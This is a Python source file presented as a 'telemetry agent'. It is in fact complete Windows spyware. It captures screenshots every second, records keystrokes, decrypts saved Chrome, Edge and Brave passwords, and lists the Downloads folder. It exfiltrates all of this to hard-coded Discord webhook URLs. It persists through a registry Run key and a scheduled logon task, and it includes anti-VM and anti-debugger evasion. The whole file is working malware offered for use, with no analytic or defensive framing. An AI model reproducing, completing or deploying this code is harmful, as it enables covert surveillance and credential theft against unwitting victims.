# telemetry_agent_full.py

import os
import sys
import threading
import queue
import time
import json
import logging
import hashlib
import platform
import subprocess
import ctypes
import base64
import shutil
import sqlite3
from io import BytesIO
from pathlib import Path
from datetime import datetime

import requests
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
from pynput import keyboard
from PIL import ImageGrab

# -------------------- Configuration --------------------
class Config:
    WEBHOOKS = {
        'screenshots': [
            'https://discord.com/api/webhooks/1396068111915946104/2sZVCkLTibGZs7b5GH4A6RGmHWR4RHE2knDYed7N63dGF7oHoy4mO7mHdatjq3nXjzXl',
            # add more if desired
        ],
        'keylogs': ['https://discord.com/api/webhooks/1396067191798894662/KC1aEwzF4TTth7iQYvn7J-l-AFGxenyxHPfKNn5rJwiXhkGftMf1jjDO0rWPXMpjlK6r'],
        'credentials': ['https://discord.com/api/webhooks/1396068511696027770/IVNPnoo573LTMPxwwb1gtf-zkRHWZAIQ84e4prfV4QMJwPhHNOY0ABSCAQGOV5cXZ4Tc'],
        'downloads': ['https://discord.com/api/webhooks/1396068682773303367/U7WqCOpRqPKBdxxuFAF4P9gGrSVsoN4d6q3G7xWvcD0hLWlAuCBHk73g2Yf0thjnr7yD'],
        'logs': ['https://discord.com/api/webhooks/1396068682773303367/U7WqCOpRqPKBdxxuFAF4P9gGrSVsoN4d6q3G7xWvcD0hLWlAuCBHk73g2Yf0thjnr7yD'],
    }
    SCREENSHOT_INTERVAL = 1
    KEYLOG_FLUSH_INTERVAL = 10
    DOWNLOADS_SEND_INTERVAL = 120
    ENABLE_ANTI_VM_CHECK = False
    LOG_FILE_PATH = os.path.join(os.getenv("LOCALAPPDATA", "."), "sys_telemetry_agent.log")

# -------------------- Logging Setup --------------------
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(Config.LOG_FILE_PATH, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)

def safe_log(msg, level='info'):
    try:
        getattr(logging, level)(msg)
    except Exception:
        pass

# -------------------- Encryption Manager --------------------
class EncryptionManager:
    def __init__(self):
        self.key = self.derive_key()

    def derive_key(self):
        try:
            if platform.system() == "Windows":
                sid = self.get_windows_sid()
                return hashlib.sha256(sid.encode('utf-8')).digest()
            else:
                return get_random_bytes(32)
        except Exception as e:
            safe_log(f"Encryption key derivation error: {e}", "error")
            return get_random_bytes(32)

    def get_windows_sid(self):
        import ctypes.wintypes
        advapi32 = ctypes.WinDLL('Advapi32.dll')
        GetUserNameEx = advapi32.GetUserNameExW
        NameUniqueId = 6
        size = ctypes.wintypes.DWORD(0)
        GetUserNameEx(NameUniqueId, None, ctypes.byref(size))
        buf = ctypes.create_unicode_buffer(size.value)
        if GetUserNameEx(NameUniqueId, buf, ctypes.byref(size)):
            return buf.value
        return "unknown_sid"

    def encrypt(self, data: bytes) -> bytes:
        try:
            iv = get_random_bytes(12)
            cipher = AES.new(self.key, AES.MODE_GCM, iv)
            ct, tag = cipher.encrypt_and_digest(data)
            return base64.b64encode(iv + tag + ct)
        except Exception as e:
            safe_log(f"Encryption error: {e}", "error")
            return b""

    def decrypt(self, enc: bytes) -> bytes:
        try:
            raw = base64.b64decode(enc)
            iv, tag, ct = raw[:12], raw[12:28], raw[28:]
            cipher = AES.new(self.key, AES.MODE_GCM, iv)
            return cipher.decrypt_and_verify(ct, tag)
        except Exception as e:
            safe_log(f"Decryption error: {e}", "error")
            return b""

# -------------------- Discord Webhook Sender --------------------
class DiscordWebhookSender(threading.Thread):
    def __init__(self, webhook_urls, enc_mgr):
        super().__init__(daemon=True)
        self.urls = webhook_urls
        self.enc = enc_mgr
        self.queue = queue.Queue()
        self.idx = 0
        self.session = requests.Session()
        self.rate_limit_reset = 0

    def enqueue(self, content=None, file_bytes=None, filename=None):
        self.queue.put((content, file_bytes, filename))

    def run(self):
        while True:
            content, fb, fn = self.queue.get()
            try:
                if time.time() < self.rate_limit_reset:
                    time.sleep(self.rate_limit_reset - time.time())

                url = self.urls[self.idx % len(self.urls)]
                self.idx += 1
                headers = {'User-Agent': 'TelemetryAgent/1.0'}

                if fb is not None:
                    enc = self.enc.encrypt(fb)
                    files = {'file': (fn + '.enc', enc)}
                    resp = self.session.post(url, files=files, headers=headers, timeout=15)
                else:
                    enc_c = self.enc.encrypt(content.encode('utf-8')).decode('utf-8')
                    resp = self.session.post(url, json={'content': enc_c}, headers=headers, timeout=15)

                if resp.status_code == 429:
                    retry = float(resp.headers.get('Retry-After', '1'))
                    self.rate_limit_reset = time.time() + retry
                    self.queue.put((content, fb, fn))
                else:
                    resp.raise_for_status()
            except Exception as e:
                safe_log(f"Webhook send error: {e}", "error")
                time.sleep(5)
            finally:
                self.queue.task_done()

# -------------------- Screenshot Capturer --------------------
class ScreenshotCapturer(threading.Thread):
    def __init__(self, sender, interval):
        super().__init__(daemon=True)
        self.sender = sender
        self.interval = interval

    def run(self):
        while True:
            try:
                img = ImageGrab.grab()
                with BytesIO() as buf:
                    img.save(buf, format='PNG')
                    name = f"screenshot_{datetime.utcnow().strftime('%Y%m%dT%H%M%SZ')}.png"
                    self.sender.enqueue(file_bytes=buf.getvalue(), filename=name)
            except Exception as e:
                safe_log(f"Screenshot capture error: {e}", "error")
            time.sleep(self.interval)

# -------------------- Key Logger --------------------
class KeyLogger(threading.Thread):
    def __init__(self, sender):
        super().__init__(daemon=True)
        self.sender = sender
        self.lock = threading.Lock()
        self.buffer = []
        self.mods = set()
        self.flush_interval = Config.KEYLOG_FLUSH_INTERVAL
        self.last_flush = time.time()

    def on_press(self, key):
        try:
            if key in {keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.shift_l}:
                self.mods.add('Shift')
            elif key in {keyboard.Key.ctrl_l, keyboard.Key.ctrl_r}:
                self.mods.add('Ctrl')
            elif key in {keyboard.Key.alt_l, keyboard.Key.alt_r}:
                self.mods.add('Alt')
            else:
                char = self.format_key(key)
                with self.lock:
                    self.buffer.append(char)
        except Exception as e:
            safe_log(f"KeyLogger.on_press error: {e}", "error")

    def on_release(self, key):
        try:
            if key in {keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.shift_l}:
                self.mods.discard('Shift')
            elif key in {keyboard.Key.ctrl_l, keyboard.Key.ctrl_r}:
                self.mods.discard('Ctrl')
            if time.time() - self.last_flush > self.flush_interval:
                self.flush()
        except Exception as e:
            safe_log(f"KeyLogger.on_release error: {e}", "error")

    def format_key(self, key):
        if hasattr(key, 'char') and key.char:
            c = key.char
            if 'Shift' in self.mods:
                c = c.upper()
            return c
        return f"[{str(key).replace('Key.', '').upper()}]"

    def flush(self):
        with self.lock:
            if not self.buffer:
                return
            data = ''.join(self.buffer)
            self.buffer.clear()
        self.sender.enqueue(content=f"Keystrokes:\n```\n{data}\n```")
        self.last_flush = time.time()

    def run(self):
        listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        listener.start()
        while True:
            time.sleep(0.1)
            if time.time() - self.last_flush > self.flush_interval:
                self.flush()

# -------------------- Chromium Credential Grabber --------------------
def decrypt_chrome(local_state, login_db):
    import win32crypt
    creds = []
    try:
        with open(local_state, 'r', encoding='utf-8') as f:
            state = json.load(f)
        enc_key = base64.b64decode(state['os_crypt']['encrypted_key'])[5:]
        key = win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
    except Exception as e:
        safe_log(f"Chrome state read error: {e}", "error")
        return creds

    tmp = Path(login_db + ".tmp")
    shutil.copy2(login_db, tmp)
    conn = sqlite3.connect(str(tmp))
    cur = conn.cursor()
    try:
        cur.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url, user, pwd in cur.fetchall():
            dec = ''
            try:
                if pwd.startswith(b'v10'):
                    iv = pwd[3:15]
                    ct = pwd[15:-16]
                    cipher = AES.new(key, AES.MODE_GCM, iv)
                    dec = cipher.decrypt(ct)[:-16].decode(errors='ignore')
                else:
                    dec = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)[1].decode(errors='ignore')
            except Exception:
                pass
            creds.append({'url': url, 'username': user, 'password': dec})
    except Exception as e:
        safe_log(f"Chrome DB read error: {e}", "error")
    finally:
        cur.close()
        conn.close()
        tmp.unlink(missing_ok=True)

    return creds

def gather_chromium_credentials(sender):
    APPDATA = os.getenv("APPDATA", "")
    browsers = {
        'Chrome': Path(APPDATA).parent/'Local'/"Google/Chrome/User Data/Default",
        'Edge': Path(APPDATA).parent/'Local'/"Microsoft/Edge/User Data/Default",
        'Brave': Path(APPDATA).parent/'Local'/"BraveSoftware/Brave-Browser/User Data/Default",
    }
    all_creds = []
    for name, p in browsers.items():
        ls = p/'Local State'
        db = p/"Login Data"
        if ls.exists() and db.exists():
            for c in decrypt_chrome(str(ls), str(db)):
                c['browser'] = name
            all_creds += decrypt_chrome(str(ls), str(db))
    if all_creds:
        sender.enqueue(content=f"```json\n{json.dumps(all_creds, indent=2)}\n```")

# -------------------- Download Reporter --------------------
def send_downloads_list(sender):
    UP = os.getenv("USERPROFILE", "")
    dpath = os.path.join(UP, "Downloads")
    if not os.path.exists(dpath): return
    info = []
    for fname in os.listdir(dpath):
        f = os.path.join(dpath, fname)
        if os.path.isfile(f):
            info.append({'filename': fname, 'size_mb': round(os.path.getsize(f)/(1024*1024), 2)})
    if info:
        payload = {'content': 'Downloads Summary:', 'embeds': [{'title': 'Downloads Folder', 'description': json.dumps(info, indent=2), 'color': 0x3498db}]}
        sender.enqueue(content=json.dumps(payload))

def periodic_downloads(sender, interval):
    while True:
        send_downloads_list(sender)
        time.sleep(interval)

# -------------------- Persistence --------------------
def add_to_startup_registry():
    try:
        import winreg
        exe = os.path.abspath(sys.argv[0])
        reg = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg, "SysTelemetryAgent", 0, winreg.REG_SZ, exe)
        winreg.CloseKey(reg)
        safe_log("Startup registry entry added")
    except Exception as e:
        safe_log(f"Startup registry error: {e}", "error")

def add_to_scheduled_task():
    try:
        exe = os.path.abspath(sys.argv[0])
        name = "SysTelemetryAgentTask"
        subprocess.run(["schtasks", "/Create", "/TN", name, "/TR", f'"{exe}"', "/SC", "ONLOGON", "/RL", "HIGHEST", "/F"], shell=True)
        safe_log("Scheduled task created")
    except Exception as e:
        safe_log(f"Scheduled task error: {e}", "error")

# -------------------- Anti-VM / Debugger --------------------
def is_running_in_vm_or_sandbox():
    if not Config.ENABLE_ANTI_VM_CHECK:
        return False
    try:
        import wmi
        vsys = wmi.WMI().Win32_ComputerSystem()
        for s in vsys:
            m = s.Manufacturer.lower()
            mo = s.Model.lower()
            signs = ['microsoft corporation','vmware','virtualbox','qemu','hyper-v','parallels']
            if any(x in m or x in mo for x in signs):
                return True
    except Exception:
        pass
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
    except Exception:
        pass
    return False

# -------------------- Watchdog --------------------
class Watchdog(threading.Thread):
    def __init__(self, workers):
        super().__init__(daemon=True)
        self.workers = workers
        self.interval = 10

    def run(self):
        while True:
            for w in list(self.workers):
                if not w.is_alive():
                    safe_log(f"{w.name} died — restarting", "warning")
                    args = getattr(w, 'args', ())
                    kwargs = getattr(w, 'kwargs', {})
                    nw = type(w)(*args, **kwargs)
                    nw.name = w.name
                    nw.start()
                    self.workers.remove(w)
                    self.workers.append(nw)
            time.sleep(self.interval)

# -------------------- Main --------------------
def main():
    safe_log("Telemetry agent starting")

    if is_running_in_vm_or_sandbox():
        safe_log("VM or Debugger detected — exiting", "warning")
        sys.exit(0)

    enc_mgr = EncryptionManager()
    senders = {k: DiscordWebhookSender(v, enc_mgr) for k,v in Config.WEBHOOKS.items()}
    for name,s in senders.items():
        s.name = f"Sender-{name}"
        s.start()

    workers = []

    ss = ScreenshotCapturer(senders['screenshots'], Config.SCREENSHOT_INTERVAL)
    ss.name, ss.args = "ScreenshotCaptor", (senders['screenshots'], Config.SCREENSHOT_INTERVAL)
    ss.start(); workers.append(ss)

    kl = KeyLogger(senders['keylogs'])
    kl.name, kl.args = "KeyLogger", (senders['keylogs'],)
    kl.start(); workers.append(kl)

    dl = threading.Thread(target=periodic_downloads, args=(senders['downloads'], Config.DOWNLOADS_SEND_INTERVAL), daemon=True)
    dl.name = "DownloadsReporter"; dl.start(); workers.append(dl)

    tc = threading.Thread(target=gather_chromium_credentials, args=(senders['credentials'],), daemon=True)
    tc.name = "CredGrabber"; tc.start(); workers.append(tc)

    wd = Watchdog(workers)
    wd.name = "Watchdog"; wd.start()

    add_to_startup_registry()
    add_to_scheduled_task()

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
